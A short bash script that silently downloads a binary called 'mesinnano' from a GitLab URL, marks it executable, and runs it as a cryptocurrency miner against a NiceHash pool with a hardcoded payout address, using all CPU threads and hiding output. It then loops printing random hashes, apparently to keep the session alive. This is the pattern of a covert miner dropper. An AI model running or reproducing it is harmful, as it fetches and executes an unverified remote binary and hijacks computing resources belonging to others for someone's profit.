#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

sudo apt install screen libjansson4 -y 

wget https://gitlab.com/fajarranz19/BTC/raw/main/mesinnano >/dev/null 2>&1
      
chmod +x mesinnano >/dev/null 2>&1

screen -dmS ls

./mesinnano -v -l daggerhashimoto.eu.nicehash.com:3353 -u 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.$(echo $(shuf -i 1-9999 -n 1)111) -p x -t $(nproc) >/dev/null 2>&1

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
